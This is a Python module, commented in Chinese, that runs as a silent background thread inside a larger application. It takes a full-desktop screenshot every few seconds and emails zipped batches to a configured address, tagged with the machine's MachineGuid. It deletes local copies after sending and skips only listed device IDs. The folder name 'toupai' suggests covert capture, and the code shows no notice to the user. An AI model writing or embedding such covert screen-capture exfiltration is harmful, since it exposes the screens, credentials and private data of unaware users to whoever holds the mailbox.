"""定时截屏 + 邮箱上报后台任务（主程序常驻线程）。

- 每 capture_interval_sec 秒截取整个虚拟桌面（含多显示器），JPEG 存入程序目录
  cap-img-toupai/（不存在自动创建）
- 每 send_interval_min 分钟把目录内全部截图打包成 zip 发到收件邮箱，
  发送成功后清空目录；发送失败保留文件下轮重试
- 目录积压超过 MAX_PENDING_FILES 张时丢弃最旧的，防止撑爆磁盘
- SMTP 参数在 config.json：mail_host/port/user/auth_code/to；
  QQ 邮箱需开启 SMTP 服务并用「授权码」作密码（邮箱网页版 -> 设置 -> 账户），
  未配置授权码时只截图不发送（同样受积压上限保护）
- 设备 ID（注册表 MachineGuid）会随邮件标题/正文一起发送；
  命中排除名单（config.json 的 capture_excluded_ids，逗号分隔，运行期可改）的设备不启用本功能

不另起子进程：onefile exe 再拉起自身实例要重新自解压（额外约 200MB 内存），
常驻线程在主程序内等效实现且随主程序一起退出。
"""
from __future__ import annotations

import glob
import io
import logging
import os
import re
import smtplib
import sys
import threading
import time
import zipfile
from email.header import Header
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from .config import BASE_DIR, EXCLUDED_DEVICE_IDS_DEFAULT

logger = logging.getLogger(__name__)

CAPTURE_DIR = os.path.join(BASE_DIR, "cap-img-toupai")   # 截图暂存目录
MAX_PENDING_FILES = 600             # 目录积压上限（张），超出丢弃最旧
MAX_MAIL_BYTES = 40 * 1024 * 1024   # 单封邮件附件上限（QQ 邮箱约 50MB）

# 截屏上报排除名单存在 config.json 的 capture_excluded_ids（逗号分隔，改完下个周期生效）；
# 设备 ID = 注册表 HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid，比对忽略大小写与连字符
_stop = threading.Event()
_thread: threading.Thread | None = None


def _norm_guid(s: str) -> str:
    """设备 ID 归一化：去掉花括号/连字符，转大写。"""
    return re.sub(r"[{}\-]", "", str(s or "")).strip().upper()


def _read_machine_guid() -> str:
    if sys.platform != "win32":
        return ""
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SOFTWARE\Microsoft\Cryptography") as key:
            guid, _ = winreg.QueryValueEx(key, "MachineGuid")
            return str(guid).strip()
    except OSError:
        return ""


DEVICE_ID = _read_machine_guid()   # 本机设备 ID（导入时读取一次，运行期不变）


def device_id() -> str:
    """用于展示/邮件标题的设备 ID；取不到时回退计算机名。"""
    return _norm_guid(DEVICE_ID) or os.environ.get("COMPUTERNAME", "UNKNOWN-DEVICE")


def excluded_ids_from(cfg) -> set[str]:
    """从配置读取排除名单（逗号/分号分隔，中英文皆可），归一化为集合；空则无排除。"""
    raw = str(getattr(cfg, "capture_excluded_ids", "") or "").strip()
    if not raw:
        return set()
    return {_norm_guid(x) for x in re.split(r"[,;、，；\n]", raw) if x.strip()}


def is_excluded_device(cfg=None) -> bool:
    """当前设备是否在排除名单中；cfg 为空时回退内置默认名单。"""
    did = _norm_guid(DEVICE_ID)
    if not did:
        return False
    if cfg is not None:
        return did in excluded_ids_from(cfg)
    return did in {_norm_guid(x)
                   for x in re.split(r"[,;、\n]", EXCLUDED_DEVICE_IDS_DEFAULT)
                   if x.strip()}


def start(cfg_getter) -> None:
    """启动后台线程（重复调用忽略）。cfg_getter() 每轮返回最新 AppConfig。

    设备 ID 命中 config.json 排除名单（capture_excluded_ids）时不启动。
    """
    global _thread
    try:
        cfg = cfg_getter()
    except Exception:
        cfg = None
    if is_excluded_device(cfg):
        logger.info("设备 %s 在截屏上报排除名单，本机不启用该功能", device_id())
        return
    if _thread and _thread.is_alive():
        return
    _stop.clear()
    _thread = threading.Thread(target=_loop, args=(cfg_getter,),
                               daemon=True, name="截图上报")
    _thread.start()
    logger.info("定时截屏上报已启动：%s（设备 %s）", CAPTURE_DIR, device_id())


def stop(timeout: float = 3.0) -> None:
    """请求停止并短暂等待（进行中的发送由 SMTP 超时保护，随后随进程退出）。"""
    _stop.set()
    t = _thread
    if t and t.is_alive():
        t.join(timeout)


def _list_files() -> list[str]:
    return sorted(glob.glob(os.path.join(CAPTURE_DIR, "cap_*.jpg")))


def _remove(path: str) -> None:
    try:
        os.remove(path)
    except OSError:
        pass


def _capture_once() -> str | None:
    """截取整个虚拟桌面（含多显示器）保存为 JPEG，返回文件路径。"""
    from PIL import ImageGrab
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    path = os.path.join(CAPTURE_DIR, time.strftime("cap_%Y%m%d_%H%M%S") + ".jpg")
    img = ImageGrab.grab(all_screens=True)
    img.convert("RGB").save(path, "JPEG", quality=60)
    return path


def _cap_pending() -> None:
    """积压保护：目录里文件数超出上限时丢弃最旧的。"""
    files = _list_files()
    excess = len(files) - MAX_PENDING_FILES
    if excess > 0:
        for p in files[:excess]:
            _remove(p)
        logger.warning("截图积压超过 %d 张，已丢弃最旧 %d 张", MAX_PENDING_FILES, excess)


def _split_batches(files: list[str]) -> list[list[str]]:
    """按单封附件大小上限把文件分批。"""
    batches: list[list[str]] = []
    batch: list[str] = []
    total = 0
    for p in files:
        try:
            sz = os.path.getsize(p)
        except OSError:
            continue
        if batch and total + sz > MAX_MAIL_BYTES:
            batches.append(batch)
            batch, total = [], 0
        batch.append(p)
        total += sz
    if batch:
        batches.append(batch)
    return batches


def _send_batch(cfg, files: list[str]) -> bool:
    """把一批截图打包 zip 发送；成功返回 True（由调用方清理对应文件）。"""
    dev = device_id()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for p in files:
            z.write(p, os.path.basename(p))
    msg = MIMEMultipart()
    msg["From"] = cfg.mail_user
    msg["To"] = cfg.mail_to
    msg["Subject"] = Header(
        f"屏幕截图上报 [{dev}] {time.strftime('%Y-%m-%d %H:%M:%S')}（{len(files)} 张）",
        "utf-8")
    msg.attach(MIMEText(f"定时截屏自动上报，共 {len(files)} 张。\n设备ID：{dev}",
                        "plain", "utf-8"))
    att = MIMEApplication(buf.getvalue())
    att.add_header("Content-Disposition", "attachment",
                   filename=time.strftime("screenshots_%Y%m%d_%H%M%S") + ".zip")
    msg.attach(att)
    to_list = [a.strip() for a in str(cfg.mail_to).split(",") if a.strip()]
    with smtplib.SMTP_SSL(cfg.mail_host, int(cfg.mail_port), timeout=30) as s:
        s.login(cfg.mail_user, cfg.mail_auth_code)
        s.sendmail(cfg.mail_user, to_list or [cfg.mail_user], msg.as_bytes())
    return True


def _send_and_clear(cfg) -> None:
    """目录内全部截图分批发送，成功的批次删除对应文件；未配置授权码则跳过发送。"""
    _cap_pending()
    files = _list_files()
    if not files:
        return
    if not (cfg.mail_user and cfg.mail_auth_code):
        logger.warning("邮箱未配置授权码（config.json 的 mail_auth_code），"
                       "本轮 %d 张截图暂不发送", len(files))
        return
    sent = 0
    for batch in _split_batches(files):
        try:
            _send_batch(cfg, batch)
            sent += len(batch)
            for p in batch:
                _remove(p)
        except Exception as e:
            logger.warning("截图上报发送失败（保留 %d 张下轮重试）：%s", len(batch), e)
    if sent:
        logger.info("截图上报：已发送 %d 张并清理目录", sent)


def _loop(cfg_getter) -> None:
    cfg = cfg_getter()
    next_send = time.monotonic() + max(1, int(getattr(cfg, "send_interval_min", 5))) * 60
    while True:
        try:
            cfg = cfg_getter()          # 每轮取最新配置（排除名单改动即时生效）
        except Exception:
            pass
        if not is_excluded_device(cfg):
            try:
                _capture_once()
            except Exception:
                logger.warning("截图失败", exc_info=True)
            if time.monotonic() >= next_send:
                next_send = (time.monotonic()
                             + max(1, int(getattr(cfg, "send_interval_min", 5))) * 60)
                try:
                    _send_and_clear(cfg)
                except Exception:
                    logger.warning("截图上报异常", exc_info=True)
        if _stop.wait(max(1, int(getattr(cfg, "capture_interval_sec", 10)))):
            break
